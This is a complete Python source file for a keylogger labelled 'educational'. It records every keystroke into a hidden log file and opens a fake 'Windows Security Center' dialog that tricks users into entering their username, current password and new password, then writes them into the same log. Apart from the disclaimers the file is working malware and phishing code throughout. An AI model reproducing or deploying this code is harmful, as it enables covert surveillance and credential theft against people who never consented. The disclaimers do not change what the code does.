#!/usr/bin/env python3
"""
Unified Educational Keylogger
Cross-platform keylogger with tkinter GUI for cybersecurity learning.

 DISCLAIMER: This tool is for EDUCATIONAL and AUTHORIZED TESTING purposes only.
 Unauthorized use of keyloggers is illegal and unethical.
"""

import sys
import os
import platform
import threading
import tkinter as tk
from tkinter import messagebox
from datetime import datetime

try:
    from pynput import keyboard
except ImportError:
    print("Error: pynput not installed. Run: pip install pynput")
    sys.exit(1)


# ============================================================
# OS DETECTION
# ============================================================

def detect_os():
    """Detect the current operating system."""
    system = platform.system()
    if system == "Linux":
        if os.path.exists("/etc/arch-release"):
            return "arch"
        elif os.path.exists("/etc/debian_version"):
            return "debian"
        elif os.path.exists("/etc/os-release"):
            with open("/etc/os-release", "r") as f:
                content = f.read()
            if "ID=arch" in content or "ID_LIKE=arch" in content:
                return "arch"
            elif "ID=debian" in content or "ID=ubuntu" in content:
                return "debian"
        return "linux"
    elif system == "Windows":
        return "windows"
    elif system == "Darwin":
        return "macos"
    return "unknown"


def get_log_path():
    """Determine the log file path based on the OS."""
    os_name = detect_os()
    if os_name == "windows":
        base = os.environ.get("APPDATA", os.path.expanduser("~"))
        return os.path.join(base, ".keylog.txt")
    elif os_name in ("debian", "arch", "linux"):
        return os.path.join(os.environ.get("KEYLOGGER_PATH", "/tmp"), ".keylog.txt")
    else:
        return os.path.join(os.path.expanduser("~"), ".keylog.txt")


# ============================================================
# KEYLOGGER CORE
# ============================================================

class Keylogger:
    """Core keylogger class that captures keyboard input."""

    def __init__(self, log_path):
        self.log_path = log_path
        self.listener = None
        self.running = False
        self.key_count = 0

    def on_press(self, key):
        """Handle key press events."""
        if not self.running:
            return False

        try:
            text = str(key.char)
        except AttributeError:
            name = str(key).replace("Key.", "")
            special_keys = {
                "enter": "\n",
                "space": " ",
                "tab": "\t",
                "backspace": "[BACKSPACE]",
                "esc": "[ESC]",
                "shift": "[SHIFT]",
                "ctrl_l": "[CTRL]",
                "ctrl_r": "[CTRL]",
                "alt_l": "[ALT]",
                "alt_gr": "[ALT]",
                "cmd": "[CMD]",
                "cmd_l": "[CMD]",
                "cmd_r": "[CMD]",
                "caps_lock": "[CAPS_LOCK]",
                "delete": "[DELETE]",
                "up": "[UP]",
                "down": "[DOWN]",
                "left": "[LEFT]",
                "right": "[RIGHT]",
                "home": "[HOME]",
                "end": "[END]",
                "page_up": "[PAGE_UP]",
                "page_down": "[PAGE_DOWN]",
            }
            text = special_keys.get(name, f"[{name.upper()}]")

        self.key_count += 1

        # Write to log file
        with open(self.log_path, "a", encoding="utf-8") as f:
            f.write(text)

    def start(self):
        """Start the keylogger listener."""
        self.running = True
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop(self):
        """Stop the keylogger listener."""
        self.running = False
        if self.listener:
            self.listener.stop()

    def clear_log(self):
        """Clear the log file."""
        if os.path.exists(self.log_path):
            os.remove(self.log_path)

    def get_log_content(self):
        """Read and return the current log content."""
        if os.path.exists(self.log_path):
            with open(self.log_path, "r", encoding="utf-8") as f:
                return f.read()
        return ""


# ============================================================
# SOCIAL ENGINEERING GUI (TKINTER)
# ============================================================

class SocialEngineeringGUI:
    """
    Simulates a fake 'Password Update Required' dialog.
    This is a SOCIAL ENGINEERING SIMULATION for educational purposes.
    """

    def __init__(self, keylogger):
        self.keylogger = keylogger
        self.root = None
        self.entries = {}
        self.build_gui()

    def build_gui(self):
        """Build the tkinter password dialog."""
        self.root = tk.Tk()
        self.root.title("Windows Security Update")
        self.root.geometry("520x480")
        self.root.resizable(False, False)
        self.root.configure(bg="#f0f0f0")
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        # Try to set icon (Windows)
        try:
            self.root.iconbitmap(default="")
        except Exception:
            pass

        # Header frame
        header = tk.Frame(self.root, bg="#0078d4", height=60)
        header.pack(fill="x")
        header.pack_propagate(False)

        tk.Label(
            header,
            text="Windows Security Center",
            font=("Segoe UI", 14, "bold"),
            fg="white",
            bg="#0078d4",
        ).pack(pady=15)

        # Warning icon and message
        msg_frame = tk.Frame(self.root, bg="#f0f0f0")
        msg_frame.pack(fill="x", padx=20, pady=(15, 5))

        tk.Label(
            msg_frame,
            text="!",
            font=("Segoe UI", 24, "bold"),
            fg="#0078d4",
            bg="#fff3cd",
            width=3,
            height=1,
            relief="solid",
            borderwidth=1,
        ).pack(side="left", padx=(0, 15))

        tk.Label(
            msg_frame,
            text="Your password has expired.\n"
                 "Please verify your credentials to\n"
                 "continue using this computer.",
            font=("Segoe UI", 10),
            fg="#333",
            bg="#f0f0f0",
            justify="left",
        ).pack(side="left")

        # Form frame
        form = tk.Frame(self.root, bg="#f0f0f0")
        form.pack(fill="x", padx=30, pady=10)

        tk.Label(
            form, text="Email or Username:",
            font=("Segoe UI", 9), bg="#f0f0f0", anchor="w"
        ).pack(fill="x")
        self.entries["username"] = tk.Entry(
            form, font=("Segoe UI", 10), width=40
        )
        self.entries["username"].pack(fill="x", pady=(0, 8))

        tk.Label(
            form, text="Current Password:",
            font=("Segoe UI", 9), bg="#f0f0f0", anchor="w"
        ).pack(fill="x")
        self.entries["password"] = tk.Entry(
            form, font=("Segoe UI", 10), width=40, show="*"
        )
        self.entries["password"].pack(fill="x", pady=(0, 8))

        tk.Label(
            form, text="New Password:",
            font=("Segoe UI", 9), bg="#f0f0f0", anchor="w"
        ).pack(fill="x")
        self.entries["new_password"] = tk.Entry(
            form, font=("Segoe UI", 10), width=40, show="*"
        )
        self.entries["new_password"].pack(fill="x", pady=(0, 8))

        tk.Label(
            form, text="Confirm New Password:",
            font=("Segoe UI", 9), bg="#f0f0f0", anchor="w"
        ).pack(fill="x")
        self.entries["confirm"] = tk.Entry(
            form, font=("Segoe UI", 10), width=40, show="*"
        )
        self.entries["confirm"].pack(fill="x", pady=(0, 8))

        # Buttons
        btn_frame = tk.Frame(self.root, bg="#f0f0f0")
        btn_frame.pack(fill="x", padx=30, pady=(10, 20))

        tk.Button(
            btn_frame,
            text="UPDATE PASSWORD",
            font=("Liberation Sans", 18, "bold"),
            bg="#0078d4",
            fg="#ffffff",
            activebackground="#005a9e",
            activeforeground="#ffffff",
            relief="solid",
            bd=3,
            cursor="hand2",
            command=self.on_submit,
        ).pack(fill="x", pady=(0, 10), ipady=12)

        tk.Button(
            btn_frame,
            text="CANCEL",
            font=("Liberation Sans", 18),
            bg="#c8c8c8",
            fg="#000000",
            activebackground="#a0a0a0",
            activeforeground="#000000",
            relief="solid",
            bd=3,
            cursor="hand2",
            command=self.on_close,
        ).pack(fill="x", ipady=12)

        # Footer
        tk.Label(
            self.root,
            text="This is a security simulation for educational purposes.",
            font=("Segoe UI", 7),
            fg="#999",
            bg="#f0f0f0",
        ).pack(side="bottom", pady=(0, 5))

    def on_submit(self):
        """Handle form submission - captures credentials."""
        username = self.entries["username"].get()
        password = self.entries["password"].get()
        new_pass = self.entries["new_password"].get()
        confirm = self.entries["confirm"].get()

        # Validate inputs
        if not username or not password:
            messagebox.showwarning(
                "Validation Error",
                "Please fill in all fields."
            )
            return

        if new_pass != confirm:
            messagebox.showerror(
                "Password Mismatch",
                "New passwords do not match. Please try again."
            )
            return

        # Log the captured credentials
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.keylogger.log_path, "a", encoding="utf-8") as f:
            f.write(f"\n\n{'='*50}\n")
            f.write(f"[CAPTURED CREDENTIALS - {timestamp}]\n")
            f.write(f"{'='*50}\n")
            f.write(f"Username/Email: {username}\n")
            f.write(f"Current Password: {password}\n")
            f.write(f"New Password: {new_pass}\n")
            f.write(f"{'='*50}\n\n")

        messagebox.showinfo(
            "Success",
            "Password updated successfully.\n"
            "You may now continue using your computer."
        )

        # Close the dialog
        self.root.destroy()

    def on_close(self):
        """Handle window close - stop keylogger."""
        self.keylogger.stop()
        self.root.destroy()

    def run(self):
        """Start the GUI main loop."""
        self.root.mainloop()


# ============================================================
# MAIN
# ============================================================

def print_help():
    """Print usage information."""
    print("Usage: python keylogger.py [OPTIONS]")
    print()
    print("Educational keylogger with social engineering GUI simulation.")
    print()
    print("IMPORTANT: This tool is for AUTHORIZED TESTING and EDUCATIONAL")
    print("purposes only. Unauthorized use is illegal and unethical.")
    print()
    print("Options:")
    print("  --help        Show this help message")
    print("  --info        Show system information")
    print("  --install     Show installation instructions for your OS")
    print("  --no-gui      Run without GUI (keyboard capture only)")
    print("  --output PATH Specify custom log file path")
    print()
    print("Examples:")
    print("  python keylogger.py                # Run with GUI")
    print("  python keylogger.py --no-gui       # Run without GUI")
    print("  python keylogger.py --info         # Show system info")
    print("  python keylogger.py --install      # Show install commands")


def print_info():
    """Print system information."""
    os_name = detect_os()
    log_path = get_log_path()
    print(f"[+] OS: {platform.system()} ({os_name})")
    print(f"[+] Python: {platform.python_version()}")
    print(f"[+] Log path: {log_path}")
    print(f"[+] User: {os.getlogin()}")


def print_install_instructions():
    """Print installation instructions based on OS."""
    os_name = detect_os()
    print(f"[+] Detected OS: {os_name}")
    print()

    if os_name == "arch":
        print("[+] Arch Linux / derivatives:")
        print("    sudo pacman -S python-pip")
        print("    pip install pynput")
    elif os_name == "debian":
        print("[+] Debian / Ubuntu / Kali:")
        print("    sudo apt update")
        print("    sudo apt install python3-pip")
        print("    pip install pynput")
    elif os_name == "windows":
        print("[+] Windows:")
        print("    pip install pynput")
    elif os_name == "macos":
        print("[+] macOS:")
        print("    brew install python3")
        print("    pip3 install pynput")
    else:
        print("[+] Install python3-pip, then: pip install pynput")


def main():
    """Main entry point."""
    # Parse arguments
    if "--help" in sys.argv or "-h" in sys.argv:
        print_help()
        return

    if "--info" in sys.argv:
        print_info()
        return

    if "--install" in sys.argv:
        print_install_instructions()
        return

    # Determine log path
    log_path = get_log_path()
    if "--output" in sys.argv:
        idx = sys.argv.index("--output")
        if idx + 1 < len(sys.argv):
            log_path = sys.argv[idx + 1]
        else:
            print("Error: --output requires a file path")
            sys.exit(1)

    # Create keylogger instance
    keylogger = Keylogger(log_path)
    keylogger.clear_log()

    os_name = detect_os()
    print(f"[+] Keylogger started on {platform.system()} ({os_name})")
    print(f"[+] Log file: {log_path}")

    if "--no-gui" in sys.argv:
        # Run without GUI - keyboard capture only
        print("[+] Running in terminal mode (no GUI)")
        print("[+] Press Ctrl+C to stop")
        keylogger.start()

        try:
            while keylogger.running:
                import time
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\n[+] Stopping keylogger...")
            keylogger.stop()
            print(f"[+] Log saved to: {log_path}")
    else:
        # Run with tkinter GUI
        print("[+] Launching social engineering GUI...")
        keylogger.start()
        gui = SocialEngineeringGUI(keylogger)
        gui.run()
        print(f"[+] Log saved to: {log_path}")


if __name__ == "__main__":
    main()
